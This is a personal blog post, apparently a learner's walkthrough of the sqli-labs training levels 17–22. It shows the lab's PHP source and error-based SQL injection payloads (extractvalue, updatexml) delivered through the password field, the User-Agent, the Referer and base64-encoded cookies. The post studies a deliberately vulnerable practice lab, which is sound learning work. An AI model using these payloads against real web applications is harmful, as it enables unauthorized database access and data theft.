@@ -1,0 +1,209 @@
+<!DOCTYPE html><html lang="zh" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>SQL实战2(sql_labs) | d0ub1eT1an</title><meta name="author" content="tiantian"><meta name="copyright" content="tiantian"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="嗯，追了两天的综艺，昨天家里线路除了点小问题，只好去商场蹭空调避暑。走着走着就去了网吧，打了一会无畏契约，然后，就没有然后了，继续练习吧！  level 17根据题目[PASSWORD RESET] 得知进入的是密码重置页面，用户名为Dhakkan 查看校验函数源码：在用户名调用了这个函数 1234567891011121314151617181920212223242526function ch">
+<meta property="og:type" content="article">
+<meta property="og:title" content="SQL实战2(sql_labs)">
+<meta property="og:url" content="http://example.com/2024/08/28/SQL%E5%AE%9E%E6%88%982/index.html">
+<meta property="og:site_name" content="d0ub1eT1an">
+<meta property="og:description" content="嗯，追了两天的综艺，昨天家里线路除了点小问题，只好去商场蹭空调避暑。走着走着就去了网吧，打了一会无畏契约，然后，就没有然后了，继续练习吧！  level 17根据题目[PASSWORD RESET] 得知进入的是密码重置页面，用户名为Dhakkan 查看校验函数源码：在用户名调用了这个函数 1234567891011121314151617181920212223242526function ch">
+<meta property="og:locale">
+<meta property="og:image" content="https://i.loli.net/2021/02/24/5O1day2nriDzjSu.png">
+<meta property="article:published_time" content="2024-08-28T04:06:27.000Z">
+<meta property="article:modified_time" content="2024-08-29T06:56:38.529Z">
+<meta property="article:author" content="tiantian">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://i.loli.net/2021/02/24/5O1day2nriDzjSu.png"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="http://example.com/2024/08/28/SQL%E5%AE%9E%E6%88%982/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css?v=4.13.0"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.5.1/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.33/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: 'Copy Successful',
+    error: 'Copy Error',
+    noSupport: 'Browser Not Supported'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: 'Just now',
+    min: 'minutes ago',
+    hour: 'hours ago',
+    day: 'days ago',
+    month: 'months ago'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.11.1/dist/infinitegrid.min.js',
+    buttonText: 'Load More'
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'SQL实战2(sql_labs)',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2024-08-29 14:56:38'
+}</script><script>(win=>{
+      win.saveToLocal = {
+        set: (key, value, ttl) => {
+          if (ttl === 0) return
+          const now = Date.now()
+          const expiry = now + ttl * 86400000
+          const item = {
+            value,
+            expiry
+          }
+          localStorage.setItem(key, JSON.stringify(item))
+        },
+      
+        get: key => {
+          const itemStr = localStorage.getItem(key)
+      
+          if (!itemStr) {
+            return undefined
+          }
+          const item = JSON.parse(itemStr)
+          const now = Date.now()
+      
+          if (now > item.expiry) {
+            localStorage.removeItem(key)
+            return undefined
+          }
+          return item.value
+        }
+      }
+    
+      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        script.onerror = reject
+        script.onload = script.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          script.onload = script.onreadystatechange = null
+          resolve()
+        }
+
+        Object.keys(attr).forEach(key => {
+          script.setAttribute(key, attr[key])
+        })
+
+        document.head.appendChild(script)
+      })
+    
+      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onerror = reject
+        link.onload = link.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          link.onload = link.onreadystatechange = null
+          resolve()
+        }
+        document.head.appendChild(link)
+      })
+    
+      win.activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+        if (t === 'dark') activateDarkMode()
+        else if (t === 'light') activateLightMode()
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+      const detectApple = () => {
+        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+          document.documentElement.classList.add('apple')
+        }
+      }
+      detectApple()
+    })(window)</script><meta name="generator" content="Hexo 7.3.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://i.loli.net/2021/02/24/5O1day2nriDzjSu.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">5</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">0</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">0</div></a></div><hr class="custom-hr"/></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header"><nav id="nav"><span id="blog-info"><a href="/" title="d0ub1eT1an"><span class="site-name">d0ub1eT1an</span></a></span><div id="menus"><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">SQL实战2(sql_labs)</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2024-08-28T04:06:27.000Z" title="Created 2024-08-28 12:06:27">2024-08-28</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2024-08-29T06:56:38.529Z" title="Updated 2024-08-29 14:56:38">2024-08-29</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="SQL实战2(sql_labs)"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">Post Views:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><p>嗯，追了两天的综艺，昨天家里线路除了点小问题，只好去商场蹭空调避暑。走着走着就去了网吧，打了一会无畏契约，然后，就没有然后了，继续练习吧！</p>
+<hr>
+<h3 id="level-17"><a href="#level-17" class="headerlink" title="level 17"></a>level 17</h3><p>根据题目[PASSWORD RESET] 得知进入的是密码重置页面，用户名为Dhakkan</p>
+<p>查看校验函数源码：在用户名调用了这个函数</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check_input</span>(<span class="params"><span class="variable">$value</span></span>)</span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$value</span>))</span><br><span class="line">		&#123;</span><br><span class="line">		<span class="comment">// truncation (see comments)</span></span><br><span class="line">		<span class="variable">$value</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$value</span>,<span class="number">0</span>,<span class="number">15</span>);</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="comment">// Stripslashes if magic quotes enabled</span></span><br><span class="line">		<span class="keyword">if</span> (<span class="title function_ invoke__">get_magic_quotes_gpc</span>())</span><br><span class="line">			&#123;</span><br><span class="line">			<span class="variable">$value</span> = <span class="title function_ invoke__">stripslashes</span>(<span class="variable">$value</span>);</span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">		<span class="comment">// Quote if not a number</span></span><br><span class="line">		<span class="keyword">if</span> (!<span class="title function_ invoke__">ctype_digit</span>(<span class="variable">$value</span>))</span><br><span class="line">			&#123;</span><br><span class="line">			<span class="variable">$value</span> = <span class="string">&quot;&#x27;&quot;</span> . <span class="title function_ invoke__">mysql_real_escape_string</span>(<span class="variable">$value</span>) . <span class="string">&quot;&#x27;&quot;</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">		&#123;</span><br><span class="line">		<span class="variable">$value</span> = <span class="title function_ invoke__">intval</span>(<span class="variable">$value</span>);</span><br><span class="line">		&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="variable">$value</span>;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
+
+<p>其中:</p>
+<ul>
+<li><p>substr：截取0到15</p>
+</li>
+<li><p>stripslashes: 删除由 <a target="_blank" rel="noopener" href="https://www.w3school.com.cn/php/func_string_addslashes.asp">addslashes()</a> 函数添加的反斜杠。</p>
+</li>
+</ul>
+<p>使用报错注入：<strong>extractvalue()报错注入</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; and (extractvalue(1,concat(0x5c,database(),0x5c)))#</span><br></pre></td></tr></table></figure>
+
+<h3 id="level-18"><a href="#level-18" class="headerlink" title="level 18:"></a>level 18:</h3><p>题目中出现了IP：Your IP ADDRESS is: 192.168.225.1和用户名Dhakkan</p>
+<p>检查源码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$uname</span> = <span class="title function_ invoke__">check_input</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;uname&#x27;</span>]);</span><br><span class="line"><span class="variable">$passwd</span> = <span class="title function_ invoke__">check_input</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;passwd&#x27;</span>]);</span><br></pre></td></tr></table></figure>
+
+<p>发现对用户框和密码框都做了校验，只能先用上关的账号密码登录进去试试了</p>
+<p>返回了UA</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Your User Agent is: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">INSERT INTO `security`.`uagents` (`uagent`, `ip_address`, `username`) <span class="title function_ invoke__">VALUES</span> (<span class="string">&#x27;$uagent&#x27;</span>, <span class="string">&#x27;$IP&#x27;</span>, <span class="variable">$uname</span>)</span><br></pre></td></tr></table></figure>
+
+<p>抓个包改UA，根据源码构造payload（替换$uagent）：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;,2,updatexml(1,concat(0x7e,database(),0x7e),1))#</span><br></pre></td></tr></table></figure>
+
+<h3 id="level-19"><a href="#level-19" class="headerlink" title="level 19:"></a>level 19:</h3><p>看起来跟18关差不多~先登录</p>
+<p>返回了referer：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Your Referer is: http://192.168.225.132/sqli-labs/Less-19/</span><br></pre></td></tr></table></figure>
+
+<p>对referer进行注入</p>
+<h3 id="level-20"><a href="#level-20" class="headerlink" title="level 20:"></a>level 20:</h3><p>登录进去返回：</p>
+<p><img src="C:\Users\天天\AppData\Roaming\Typora\typora-user-images\image-20240829143325276.png" alt="image-20240829143325276"></p>
+<p>看源码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//寻找注入点</span></span><br><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users WHERE username=&#x27;<span class="subst">$cookee</span>&#x27; LIMIT 0,1&quot;</span>;</span><br><span class="line"><span class="comment">//在cookie:uname</span></span><br><span class="line"><span class="variable">$cookee</span> = <span class="variable">$_COOKIE</span>[<span class="string">&#x27;uname&#x27;</span>];</span><br></pre></td></tr></table></figure>
+
+<h3 id="level-21："><a href="#level-21：" class="headerlink" title="level 21："></a>level 21：</h3><p>登陆进去发现跟刚刚相比，cookie做了编码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">YOUR COOKIE : uname = ZGhha2thbg</span><br></pre></td></tr></table></figure>
+
+<p>把注入语句做一下编码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">MScpIGFuZCB1cGRhdGV4bWwoMSxjb25jYXQoMHg3ZSxkYXRhYmFzZSgpLDB4N2UpLDEpIw==</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="level-22"><a href="#level-22" class="headerlink" title="level 22:"></a>level 22:</h3><p>跟21关大同小异，改了一下闭合就出来了</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">MSIgYW5kIHVwZGF0ZXhtbCgxLGNvbmNhdCgweDdlLGRhdGFiYXNlKCksMHg3ZSksMSkj</span><br></pre></td></tr></table></figure>
+
+<hr>
+<p>这个题目真是看的我心力交瘁，现在就先练习这么多吧，将来有时间再更新。</p>
+<p>下面的计划是复习一下应急响应跟等保、风评这些概念性的东西</p>
+<p>浏览了一下招聘软件，感觉现在越来越卷了，可能后面还得学点自动化、逆向之类的东西</p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>Author: </span><span class="post-copyright-info"><a href="http://example.com">tiantian</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>Link: </span><span class="post-copyright-info"><a href="http://example.com/2024/08/28/SQL%E5%AE%9E%E6%88%982/">http://example.com/2024/08/28/SQL%E5%AE%9E%E6%88%982/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>Copyright Notice: </span><span class="post-copyright-info">All articles in this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless stating additionally.</span></div></div><div class="tag_share"><div class="post-meta__tag-list"></div><div class="post_share"><div class="social-share" data-image="https://i.loli.net/2021/02/24/5O1day2nriDzjSu.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="next-post pull-full"><a href="/2024/08/26/SQL%E5%AE%9E%E6%88%98/" title="SQL实战1（sqli_labs）"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">Next</div><div class="next_info">SQL实战1（sqli_labs）</div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="https://i.loli.net/2021/02/24/5O1day2nriDzjSu.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">tiantian</div><div class="author-info__description"></div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">5</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">0</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">0</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/xxxxxx"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>Announcement</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>Contents</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#level-17"><span class="toc-number">1.</span> <span class="toc-text">level 17</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#level-18"><span class="toc-number">2.</span> <span class="toc-text">level 18:</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#level-19"><span class="toc-number">3.</span> <span class="toc-text">level 19:</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#level-20"><span class="toc-number">4.</span> <span class="toc-text">level 20:</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#level-21%EF%BC%9A"><span class="toc-number">5.</span> <span class="toc-text">level 21：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#level-22"><span class="toc-number">6.</span> <span class="toc-text">level 22:</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>Recent Post</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/08/28/SQL%E5%AE%9E%E6%88%982/" title="SQL实战2(sql_labs)">SQL实战2(sql_labs)</a><time datetime="2024-08-28T04:06:27.000Z" title="Created 2024-08-28 12:06:27">2024-08-28</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/08/26/SQL%E5%AE%9E%E6%88%98/" title="SQL实战1（sqli_labs）">SQL实战1（sqli_labs）</a><time datetime="2024-08-26T06:45:07.000Z" title="Created 2024-08-26 14:45:07">2024-08-26</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/08/23/SQL%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB/" title="SQL注入攻击">SQL注入攻击</a><time datetime="2024-08-23T03:18:03.000Z" title="Created 2024-08-23 11:18:03">2024-08-23</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/08/23/%E7%AC%AC%E4%B8%80%E7%AF%87%E5%8D%9A%E5%AE%A2/" title="第一篇博客">第一篇博客</a><time datetime="2024-08-23T03:05:52.000Z" title="Created 2024-08-23 11:05:52">2024-08-23</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/08/22/hello-world/" title="Hello World">Hello World</a><time datetime="2024-08-22T10:28:46.708Z" title="Created 2024-08-22 18:28:46">2024-08-22</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2024 By tiantian</div><div class="framework-info"><span>Framework </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>Theme </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Read Mode"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="Toggle Between Light And Dark Mode"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="Toggle between Single-column and Double-column"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="Setting"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table Of Contents"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="Back To Top"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=4.13.0"></script><script src="/js/main.js?v=4.13.0"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.33/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
